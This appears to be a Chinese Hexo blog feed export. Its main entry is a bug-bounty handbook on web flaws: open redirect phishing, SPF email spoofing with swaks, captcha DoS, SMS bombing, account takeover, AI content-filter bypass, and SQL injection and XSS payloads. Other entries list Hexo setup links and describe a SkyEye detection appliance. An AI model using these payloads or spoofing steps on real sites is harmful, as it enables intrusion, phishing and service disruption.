id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p>1、有手机号验证的功能都可以试试、注册、登录、重置、注销等<br>2、默认如果爆破有问题，可以调整burp爆破线程和爆破速度</p><p>3.小字典没爆破出来，可以用大字典试一试</p><p>写报告打码手机号和信息</p><h3 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h3><p>操作步骤 ：只查看302的包，看见类似于url&#x3D;?,reurl?，等参数，把里面的参数网站进行更改为你想要的目标网站，看看响应包里面是否有location是否全部都是你想要的目标网站，如果无法判断，复制url参数到浏览器，看是否进行跳转</p><h3 id="任意地址跳转（加载-xss）"><a href="#任意地址跳转（加载-xss）" class="headerlink" title="任意地址跳转（加载+xss）"></a>任意地址跳转（加载+xss）</h3><p>挖洞工具：Burp Suite+svg xss文件<br>挖洞手法：地址跳转<br>挖洞思路：发现协议地址可控，可以修改协议实现钓鱼，也可加载上传的xss文件</p><p>常见于各种服务协议</p><p><a href="https://xxx.com/payment/confirm?productCode=0f9aa6d92aa4500a30a06cddfe0d2ee&productName=xxx&**protocol=https://Xxx.com/N1.2/AUTH_acsp-ESG-ACSP-CORE/%E5%95%86%E5%93%81%E5%8D%8F%E8%AE%AE.html**&despatchWay=%E7%BA%BF%E4%B8%8A">https://xxx.com/payment/confirm?productCode=0f9aa6d92aa4500a30a06cddfe0d2ee&amp;productName=xxx&amp;**protocol=https://Xxx.com/N1.2/AUTH_acsp-ESG-ACSP-CORE/商品协议.html**&amp;despatchWay=线上</a><br>&amp;companyName&#x3D;&amp;skuCode&#x3D;512609fd95fd4bf1b3c6153aaff7436&amp;standard&#x3D;签署流量套餐&amp;period&#x3D;50000份<br>&amp;amount&#x3D;10000.00</p><p>protocol&#x3D;https:&#x2F;&#x2F;自己域名.com&#x2F;钓鱼.html</p><p>protocol&#x3D;<a href="https://xxx.com/v1.2/AUTH_acsp-ESG-ACSP">https://xxx.com/v1.2/AUTH_acsp-ESG-ACSP</a><br>CORE&#x2F;xss.svg</p><h3 id="评论内容涉政涉黄"><a href="#评论内容涉政涉黄" class="headerlink" title="评论内容涉政涉黄"></a>评论内容涉政涉黄</h3><p>挖洞手法：公开发布违规内容<br>挖洞思路：发现公开评论区，尝试发布违规内容，未被检测或审核，成功发布</p><h3 id="登录频繁限制绕过"><a href="#登录频繁限制绕过" class="headerlink" title="登录频繁限制绕过"></a>登录频繁限制绕过</h3><p>挖洞手法：手机号空格爆破<br>挖洞思路：登录多次出现频繁限制，尝试使用手机号空格变型绕过</p><h3 id="DNS域传送"><a href="#DNS域传送" class="headerlink" title="DNS域传送"></a>DNS域传送</h3><p>操作步骤：<br>探测域名使用的dns服务器：dig ns *.com<br>探测dns服务器是否存在域传送漏洞：dig axfr {dns服务器}</p><p>如果成功会出现域名解析ip,没有成功会出现失败的英文 </p><p>批量工具：<br>[zZone-Transfer]: <a href="https://github.com/Xyntax/zZone-Transfer">GitHub - Xyntax&#x2F;zZone-Transfer: DNS域传送漏洞探测工具。多线程，批…</a></p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\AppData\Roaming\Typora\typora-user-images\1712402375888.png" alt="1712402375888"></p><h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><p>工具：<br>[dirsearch]: <a href="https://github.com/maurosoria/dirsearch">GitHub - maurosoria&#x2F;dirsearch: Web path scanner</a><br>案例：db.tar.gz<br>漏洞报告小tip：让gpt帮忙写漏洞危害：网页构造特殊路径上可以直接下载到网站源码，请问这有什么危害？</p><h3 id="日志泄露及其它接口敏感界面泄露"><a href="#日志泄露及其它接口敏感界面泄露" class="headerlink" title="日志泄露及其它接口敏感界面泄露"></a>日志泄露及其它接口敏感界面泄露</h3><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\AppData\Roaming\Typora\typora-user-images\1712625384609.png" alt="1712625384609"></p><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\AppData\Roaming\Typora\typora-user-images\1712625427988.png" alt="1712625427988"></p><h3 id="各种备份文件"><a href="#各种备份文件" class="headerlink" title="各种备份文件"></a>各种备份文件</h3><p>linux脚本泄露，扫到了下载下来类似.sh、zip、log、tar.gz这些东西<br>或者.gt和.svn池露，里面都需要有敏感数据才行例如</p><h3 id="druid未授权访问"><a href="#druid未授权访问" class="headerlink" title="druid未授权访问"></a>druid未授权访问</h3><p>漏洞说明：Druid由阿里巴巴数据库出品，为监控而生的数据库连接池，并且Druid可以提供监控，<br>监控SQL的执行时间、监控Web URIE的请求、Session.监控等功能，使用广泛。<br>需要明确：Drud本身是不存在漏洞的，Druid未授权访问是因为开发者配置的不够全面，导致攻击<br>者输入ip&#x2F;druid&#x2F;,index.html即可直接即可登录到Druid.监控界面，这就是所谓未授权，即可访问。</p><p>常用的30+种未授权访问漏洞汇总：<br><a href="https://www.freebuf.com/articles/web/338459.html">https://www.freebuf.com/articles/web/338459.html</a></p><h3 id="并发漏洞"><a href="#并发漏洞" class="headerlink" title="并发漏洞"></a>并发漏洞</h3><p>可以使用burp插件 Turbo intruder ,可以把我们需要并发操作的包发向这个插件然后选择操作</p><h3 id="swagger接口文档泄露"><a href="#swagger接口文档泄露" class="headerlink" title="swagger接口文档泄露"></a>swagger接口文档泄露</h3><p><img src="/2024/10/31/Fannn%E7%9A%84%E6%8C%96%E6%8E%98%E6%89%8B%E5%86%8C/Users\31055\AppData\Roaming\Typora\typora-user-images\1713014581440.png" alt="1713014581440"></p><h3 id="安全日志诬陷漏洞"><a href="#安全日志诬陷漏洞" class="headerlink" title="安全日志诬陷漏洞"></a>安全日志诬陷漏洞</h3><p>使用burp插件，burpfakelP给所有请求头加一个伪造的IP</p><p>危害：删除数据然后诬陷别人呢？</p><h3 id="jsonpxss漏洞"><a href="#jsonpxss漏洞" class="headerlink" title="jsonpxss漏洞"></a>jsonpxss漏洞</h3><p>使用工具：burp插件 jsonphunter<br>JSONP(JSON with Padding):JSONP是一种利用<script>标签加载外部资源的技术。它允许<br>网页从不同的域中获取数据并进行交互，绕过了浏览器的同源策胳限制。然而，由于缺乏<br>安全验证机制，攻击者可以将恶意代码注入到返回json响应中，从而导致安全漏洞。</p><p>条件：</p><p>1、返回content-type为text/html</p><p>2、get或post中的callback参数可控</p><p><img src="C:\Users\31055\AppData\Roaming\Typora\typora-user-images\1712409432203.png" alt="1712409432203"></p><h3 id="sourcemap文件泄露"><a href="#sourcemap文件泄露" class="headerlink" title="sourcemap文件泄露"></a>sourcemap文件泄露</h3><p>使用油猴脚本：sourcemap-searcher、或burp hae插件<br>油猴脚本：F12控制台输入sms()如果存在会有提示，然后打开看能否下载下来，能下下来的话用，nodejs进行反编译，然后可以分析里面接口挖别的漏洞，或者直接提交，也是收的少，图一乐。</p><p>nodejs编译</p><p>把出现泄露的js.map 下载下来，放在 reverse-sourcemap 里面  </p><p>reverse-sourcemap  -v ***.js.map -o   xxx</p><h3 id="图片验证码大小可控导致ddos"><a href="#图片验证码大小可控导致ddos" class="headerlink" title="图片验证码大小可控导致ddos"></a>图片验证码大小可控导致ddos</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.xx.xx.xx/DEV_GBK_1.4.0/gbk/install_package/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background=</span><br></pre></td></tr></table></figure><p>这里我们注意两个参数:<strong>width和height</strong>,这两个意思字面理解为长度和宽度,那么我们尝试修改它的大小:</p><p>更改width和height这两个参数改成无限大，注意不要把服务器跑崩</p><h3 id="GO语言内存泄露"><a href="#GO语言内存泄露" class="headerlink" title="GO语言内存泄露"></a>GO语言内存泄露</h3><p>危害：旗下网站存在go语言pprof信息泄露，越来越多的程序和站点都在使用Go语言进行开发，Go语言提供了相关的调试工具，即包net/http/pprof,.可对程序和服务器进行调试分析。默认情况下，不对pprof做限制，则意味可以直接访问获取相关的敏感信息。</p><p>信息泄露内容如下： </p><blockquote><p>allocs:记录了其内存分配情况，点击直接查看即可。<br>bock：跟踪堵塞情况，默认不开启，如果开启的话，可以大慨知道程序的一些目录结构和文件名。 cmdline:获取程序启动时的命令和参数，一般会暴露其物理路径。<br>goroutine:查看协程信息，会泄露go包所在位置以及程序的相关信息。<br>heap:查看堆信息和GC垃圾回收信息。<br>mutex:互斥锁的堆栈跟踪，默认不开启。<br>profile:CPU相关信息。<br>threadcreate:线程堆栈跟踪。<br>trace:跟踪Go程序运行中的运行时事件。那么如何根据上面的参数来查看相关信息，这里也简单记录下，首先第一种是访问相关URL带上?debug=参数.可直接在浏览器杳看：</p></blockquote><h2 id="中危"><a href="#中危" class="headerlink" title="中危"></a>中危</h2><h3 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h3><p>主要是增删改</p><p>注意csrf漏洞测试前一定要观察和测试鉴权字段是否在<br>cookie中，如果不在就不用测试了,还有返回结果是json格式</p><p>生成html一定要在同一个浏览器里面</p><h3 id="文件上传XSS"><a href="#文件上传XSS" class="headerlink" title="文件上传XSS"></a>文件上传XSS</h3><h3 id="取消任意出库单"><a href="#取消任意出库单" class="headerlink" title="取消任意出库单"></a>取消任意出库单</h3><p>挖洞手法：前端验证绕过<br>挖洞思路：发现文件上传口且根目录是主站，尝试上传xss,格式有限制，更改绕过 上传svgxss</p><p>水平越权</p><p>取消功能抓包发现id字段，更改后成功越权取消，且id可遍历</p><h3 id="AI限制绕过"><a href="#AI限制绕过" class="headerlink" title="AI限制绕过"></a>AI限制绕过</h3><p>操作过程：</p><p>在类似于gpt功能，绕过限制，可以生成不良内容的图片或信息，</p><p>危害：</p><p>1、损害声誉：不良图片可能会对企业、组织或个人的声誉造成损害。如果这些图片与某个品<br>牌或组织相关联，那么它们可能会导致公众对该品牌或组织的负面看法。<br>2、法律风险：不良图片可能涉及非法行为，例如侵犯版权、淫秽或诽谤等。使用或传播此<br>类图片可能会导致法律风险和处罚。</p><h3 id="spf邮件伪造"><a href="#spf邮件伪造" class="headerlink" title="spf邮件伪造"></a>spf邮件伪造</h3><p>漏洞危害：可以用未进行安全配置的网站域名，发送邮件。比如<br><a href="http://www.baidu.com%E6%9C%89%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BD%A0%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BC%AA%E9%80%A0HR@baidu.com给受害人发邮件进行/">www.baidu.com有这个漏洞，你就可以伪造HR@baidu.com给受害人发邮件进行</a><br>钓鱼。src收的少，众测和自己的渗透项目可以交，但是我交这个还行。<br>怎么挖：成baidu.com<br>看下图，如果是-all就是不存在，~all就是存在     </p><p>只能是自己的网易邮箱！！！</p><p>利用工具：kali自带的swaks<br>工具攻击命令：swaks-body"钓鱼邮件测试"-header"Subject:钓鱼测试"-t地图<br>大师@163.com(自己的邮箱)-f"<a href="mailto:&#116;&#101;&#x73;&#116;&#64;&#x62;&#x61;&#105;&#x64;&#x75;&#x2e;&#x63;&#x6f;&#x6d;">&#116;&#101;&#x73;&#116;&#64;&#x62;&#x61;&#105;&#x64;&#x75;&#x2e;&#x63;&#x6f;&#x6d;</a>"（测试邮箱网站）  </p><p>验证：能收到邮件就说明存在此漏洞</p><p>swaks -body "1" -header "Subject:2" -t <a href="mailto:&#x31;&#56;&#50;&#x37;&#49;&#x35;&#x38;&#55;&#56;&#x34;&#x33;&#64;&#49;&#x36;&#51;&#46;&#99;&#111;&#109;">&#x31;&#56;&#50;&#x37;&#49;&#x35;&#x38;&#55;&#56;&#x34;&#x33;&#64;&#49;&#x36;&#51;&#46;&#99;&#111;&#109;</a> -f "test@测"</p><p><img src="C:\Users\31055\AppData\Roaming\Typora\typora-user-images\1712407265349.png" alt="1712407265349"></p><p><img src="C:\Users\31055\AppData\Roaming\Typora\typora-user-images\1712407401664.png" alt="1712407401664"></p><p>1分无限购买面试场次</p><p>挖洞手法：商品id遍历<br>挖洞思路：购买发现商品id可遍历，遍历后发现1分商品，且可无限下单</p><p>登录口绕不过的图片验证码漏洞</p><h3 id="图片验证码失效"><a href="#图片验证码失效" class="headerlink" title="图片验证码失效"></a>图片验证码失效</h3><h4 id="1、图片验证码直接返回在返回包中（最少见）"><a href="#1、图片验证码直接返回在返回包中（最少见）" class="headerlink" title="1、图片验证码直接返回在返回包中（最少见）"></a>1、图片验证码直接返回在返回包中（最少见）</h4><h4 id="2、图片验证码字段可删除"><a href="#2、图片验证码字段可删除" class="headerlink" title="2、图片验证码字段可删除"></a>2、图片验证码字段可删除</h4><p>将数据包中的type字段改为0，并删除掉validCode=x5qs,即可发送短信，绕过了图片验证码机制，进行短信轰炸</p><h4 id="3、图片验证码不失效，可进行爆破-100"><a href="#3、图片验证码不失效，可进行爆破-100" class="headerlink" title="3、图片验证码不失效，可进行爆破 100"></a>3、图片验证码不失效，可进行爆破 100</h4><p>该案例中第一次将图片验证码填写正确后，输入任意账户密码，点击登录进行抓包，报文中的random字段为图片验证码，直接爆破即可，此处图片验证码可无限复用</p><h4 id="4、图片验证码拒绝服务漏洞（验证码doS"><a href="#4、图片验证码拒绝服务漏洞（验证码doS" class="headerlink" title="4、图片验证码拒绝服务漏洞（验证码doS)"></a>4、图片验证码拒绝服务漏洞（验证码doS)</h4><p>漏洞原理：开发者在网站开发过程中为了图片验证码能够适应网站在显示过程中的大小，从而加入了隐藏参数，当这个参数被攻击者猜测出以后，攻击者就可以修改图片验证码、二维码的大小，让服务端返回的验证码无限放大，最终导致服务端生成的图片超级大然后网站停止服务。<br>如何测试：<br>1、点击图片验证码进行抓包<br>2、在请求后面拼接隐藏参数：height、width、size、mergin、h、w等实战过程中以h、w、height、width居多<br>3、<strong>逐步增加大小</strong>例如：第一次：height=:111第二次：height=222,看burp会不会延时，或者直接看burp响应中的Renderi模块图片有没有变形</p><h3 id="未授权访问和信息泄露结合findsomething"><a href="#未授权访问和信息泄露结合findsomething" class="headerlink" title="未授权访问和信息泄露结合findsomething"></a>未授权访问和信息泄露结合findsomething</h3><p>未授权的测试：<br>复制url放入burp模块直接结合登录口域名进行爆破，get爆破一遍，post爆破一遍有时候能捡到未授极访问</p><h2 id="高危"><a href="#高危" class="headerlink" title="高危"></a>高危</h2><h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>平行越权改ID，垂直越权改鉴权</p><h3 id="任意用户"><a href="#任意用户" class="headerlink" title="任意用户"></a>任意用户</h3><p>任意用户注册、任意用户重置、任意用户登录</p><h4 id="任意用户注册（低危）"><a href="#任意用户注册（低危）" class="headerlink" title="任意用户注册（低危）"></a>任意用户注册（低危）</h4><h5 id="可覆盖注册"><a href="#可覆盖注册" class="headerlink" title="可覆盖注册"></a>可覆盖注册</h5><h5 id="不可覆盖注册"><a href="#不可覆盖注册" class="headerlink" title="不可覆盖注册"></a>不可覆盖注册</h5><p>这个漏洞是因为收到的验证码和手机号没有进行校验，暂时还没有碰到真实的案例</p><p>操作步骤：</p><p>正常输入一个手机号，进行注册，然后在要进行登录的同时进行抓包，将手机号进行替换</p><h4 id="2-任意用户登录"><a href="#2-任意用户登录" class="headerlink" title="2.任意用户登录"></a>2.任意用户登录</h4><h4 id="3-任意用户密码重置"><a href="#3-任意用户密码重置" class="headerlink" title="3.任意用户密码重置"></a>3.任意用户密码重置</h4><h4 id="4-任意用户注销"><a href="#4-任意用户注销" class="headerlink" title="4.任意用户注销"></a>4.任意用户注销</h4><p>场景：短信验证码场景（满足上述四个类型）<br>(1)短信验证码直接写在回显的包里<br>(2)可以把同一个短信验证码发给两个不同的手机号（一个受害者一个攻击者)<br>(3)四位数短信验证码可爆破</p><p>实战案例1：</p><p>四位数验证码爆破-任意用户登录+任意用户密码重置（两个功<br>能用的同一个短信接口)+价格：2200元</p><p>实战案例2：</p><p>不同手机号收到相同验证码</p><p>实战案例3：</p><p>任意用户密码修改-短信验证码写在响应包里（测试系统居多）</p><p>实战案例4：任意用户密码重置</p><h3 id="登录口总结"><a href="#登录口总结" class="headerlink" title="登录口总结"></a>登录口总结</h3><p>SQL注入<br>未授权访问-详细的等下节课，比如直接构造一个接口地址实现未授权访问<br>任意用户本节课讲的那些-任意用户<br>短信轰炸（短信炸弹）-一只收纵向、不要横向<br>越权-比如直接构造一个注册接口去注册账号实现越权登陆<br>路径泄露-比如tp框架的<br>Ur跳转漏河-看z神的0-1分享<br>弱▣令-字典看星球置顶的链接、以及一些设备的弱口令：<br>https:j//wiki.bylibrary.cn/E9%80%9FXE6%9FXA5%E85A15A8/E55B8%88%E8%A7181E48A*A7%E5%93%81%E5%8C%B1%E.</p><p>并发短信轰炸-看星球，攫并发短信轰炸<br>用户名枚举-捡洞神器-附件<br>账号锁定-流氓行为-附件<br>xss漏洞-比如你直接在一个登陆：javascript:alert(1)<br><a href="http://www.example.com/?urlewww.evil.com">http://www.example.com?urlewww.evil.com</a><br><a href="http://www.example.com/?url=javascript:alert(1)">http://www.example.com?url=javascript:alert(1)</a><br>验证码ddos-查看r0的0-1分享<br>nday比如shiro、还有一些cms的、oa等<br>任意文件下载</p><h2 id="漏洞杂谈"><a href="#漏洞杂谈" class="headerlink" title="漏洞杂谈"></a>漏洞杂谈</h2><p>漏洞小思路：<br>1、挖src的时候，在一个站挖出了一些常规漏洞，可以将该站的favicon.ico保存下来，<br>丢在fofa中，然后刷一追，增加额外收获</p><p>通常来说，注入不一定都在小型sc,其实某里这些大公司的src都有注入，也别想着这些<br>src的注入payload很难很难，有些简单的payload都能直接达到效果，都可以试试，而且注<br>入不一定在边缘域名，主站也可能存在<br>注入<br>2)怼payload</p><p>(高频：0%27 XOR(if(now()=sysdate(),sleep(3),0))XOR'Z)</p><p>extractvalue(1,concat(char(126),database()))</p><p><a href="https://cloud.tencent.com/developer/article/1835865">复盘某奇葩SQL时间延迟盲注(1)-腾讯云开发者社区-腾讯云 (tencent.com)</a>3)使用扫描器<br>某里主站：</p><p><img src="C:\Users\31055\AppData\Roaming\Typora\typora-user-images\1713326195238.png" alt="1713326195238"></p><p>{ quick":"0"%2C"spec":[]%2C" goods_id":"if(now ()=sysdate()%2Csleep(if((length(database ())=20),3,0))%2C0)"%2C"number":"1"%2c" parent":"0"}</p><p>宝藏站的特征</p><p>漏洞多的资产一般都是叫Xx管理平台、Xx后台、x企业操作系统特征如下，登录口可以用手机号或邮箱直接注册：</p><p>最好的情况下就是，这个站还可以创建一堆的子用户（便于我们测试垂直越权)，这样的网站他们被各路大神有一个统一的叫法：</p><p>可注册网站环境配置</p><p>1、如果这个网站只能注册同权限账号，那就用两个手机号注册两个账号，<br>用户名尽量有所区分（便于测试越权的时候不会看花眼）<br>2、如果这个网站注册进去还能创建子账号，建议注册两个管理员账户，两<br>个子账户，便于测试垂直越权和子账户的平行越权<br>注意：可注册网站功能比较多的时候，干万不要图快，必须挨个功能点去<br>肝，一个功能点都不能错过所以测洞一定要全，不要急。</p><p>【封ip的情况下】挂好burp的下级代理</p><p>settings->network->connections->upstream proxy seervers</p><p>4、注意点：测得时候建议burp自带的浏览器登录自己主要测试账号，谷歌登录要被越权的账号</p></script></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞手册 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+github</title>
      <link href="/2024/10/31/hexo-github/"/>
      <url>/2024/10/31/hexo-github/</url>
      
        <content type="html"><![CDATA[<p>备份一下，hexo+github的 安装步骤和 使用教程</p><p><a href="https://blog.csdn.net/cat_bayi/article/details/128725230">Hexo教程，看这一篇就够了- How to系列-CSDN博客</a></p><p><a href="https://cloud.tencent.com/developer/article/2337246">使用Hexo从0到1搭建个人博客详细教程（超详细，超简单）-腾讯云开发者社区-腾讯云</a></p><p><a href="https://wokron.github.io/posts/hexo-personal-blog-tutorial/">Hexo 个人博客搭建及主题配置教程 | Wokron’s Blog</a></p><p><a href="https://zxalive.com/">Pager 2 - 知行博客</a></p><p><a href="https://jamhus-tao.github.io/posts/blog-hexo-3-theme-butterfly/">Github + Hexo + Butterfly 建站笔记(三) - Butterfly 主题 | JamhusTao の Blog</a></p><p><a href="https://niezicheng.github.io/blog-hexo/posts/b86e2546/#Gallery-%E7%9B%B8%E5%86%8C">Hexo Butterfly 功能进阶教程 (三) | Arvinjun の站点</a></p><p><a href="https://butterfly.js.org/posts/507c070f/">Butterfly添加全局吸底Aplayer教程 | Butterfly</a><br>首页文章轮播<br><a href="https://blog.liushen.fun/posts/6af2a5bb/">https://blog.liushen.fun/posts/6af2a5bb/</a><br>美化教程<br><a href="https://butterfly.zhheo.com/loading.html">https://butterfly.zhheo.com/loading.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 备份 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网学习</title>
      <link href="/2024/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>天眼安全设备</title>
      <link href="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/"/>
      <url>/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="天眼（天眼新一代安全感知系统，高级检测溯源的产品）"><a href="#天眼（天眼新一代安全感知系统，高级检测溯源的产品）" class="headerlink" title="天眼（天眼新一代安全感知系统，高级检测溯源的产品）"></a>天眼（天眼新一代安全感知系统，高级检测溯源的产品）</h1><h2 id="天眼的功能"><a href="#天眼的功能" class="headerlink" title="天眼的功能"></a>天眼的功能</h2><p>发现、分析、溯源</p><p>发现网络的攻击行为并结合其他的安全设备进行 及时阻断网络攻击并对攻击成功的事件进行一个溯源分析</p><p>检测、响应、溯源</p><h2 id="天眼的构造"><a href="#天眼的构造" class="headerlink" title="天眼的构造"></a>天眼的构造</h2><p>分析平台：存储全量的一个日志和结果（大型数据库，存储流量传感器的流量）提供了一个面向客户的交互式的页面</p><p>流量传感器:接受流量的镜像全量还原成流量日志</p><p>文件威胁鉴定器：和流量传感器进行联动，收集流量传感器上的文件，配合检索引擎去进行文件的告警分析</p><p>沙箱</p><h2 id="部署场景"><a href="#部署场景" class="headerlink" title="部署场景"></a>部署场景</h2><p>流量传感器     部署在服务器区以及办公区，将告警日志和网络日志发送给分析平台</p><p>文件威胁鉴定器 接受流量传感器的文件及文件日志，将文件日志发送给分析平台（沙箱）</p><p>分析平台   将威胁情报发送给云端大数据平台威胁情报中心</p><p>注：天眼威胁监测与分析系统(SkyEye)的各个组件均采取旁路部署的模式，组成一个独立的网络，不会和用户本身的网络产生交集</p><h2 id="流量传感器平台"><a href="#流量传感器平台" class="headerlink" title="流量传感器平台"></a>流量传感器平台</h2><p>主要对网络流量进行解码，还原真实的流量、提取网络层、传输层、应用层的头部流量或者一些负载信息，对流量中的文件去进行一个还原，这些信息通过加密渠道发送或者威胁鉴定器里进行统一的处理、支持ipv4和ipv6</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575156028.png" alt="1719575156028"></p><p>状态监听包括：设备连接状态、设备列表、资源占用、系统信息、授权信息、攻击规则信息、威胁情报信息、网络流量、应用流量、数据采集、会话监控、文件类型统计、日志外发统计。</p><p>解码小工具</p><p>在【威胁告警】-【详情】因为在告警详情中，对于url编码、base64编码、以及各种中文编码，浏览器不能提供直接的转义功能，导致部分告警分析存在困难，所以提供此小工具对各种编码内容进行转义。</p><p>【威胁告警】-【告警列表】展示网页漏洞利用、webshe11上传、网络攻击、威胁情报4种类型的所有告警。</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575293470.png" alt="1719575293470"></p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575431437.png" alt="1719575431437"></p><p>规则配置</p><p>【规则配置】模块提供【网页漏洞利用】、【webshell上传】、【网络攻击】、【自定义规则】配置管理功能，支持查询、启停，自定义规则配置等操作。提供规则的规则编号、规则名称、威胁等级、规则分类、启用状态的筛选过滤，过滤查询字段之间可以进行组合查询。并支持单条规则启用、关闭以及对选中的规则进行批量启用、关闭的操作。同时提供了对每条规则详情的查看操作。</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575540837.png" alt="1719575540837"></p><p>【规则配置】一【自定义规则】分为两个模块，其中包含漏洞规则、威胁情报。</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575626255.png" alt="1719575626255"></p><p>自定义规则可进行导入导出</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575665906.png" alt="1719575665906"></p><p>威胁检测</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575759490.png" alt="1719575759490"></p><p>开启xff,可进行识别源ip</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575847085.png" alt="1719575847085"></p><p>弱口令可进行正则匹配</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719575971162.png" alt="1719575971162"></p><p>流量记录</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576022092.png" alt="1719576022092"></p><p>文件还原（文件最大不能超过五十mb）</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576149467.png" alt="1719576149467"></p><p>抓包检测</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576238154.png" alt="1719576238154"></p><p>旁路阻断</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576328533.png" alt="1719576328533"></p><p>ssl解密，专门针对https</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576615040.png" alt="1719576615040"></p><p>白名单配置</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576718811.png" alt="1719576718811"></p><p>系统管理</p><p><img src="/2024/06/30/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%A4%A9%E7%9C%BC%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/Users\31055\Documents\天眼\1719576780954.png" alt="1719576780954"></p><p>升级配置 （建议自动更新）</p><p><img 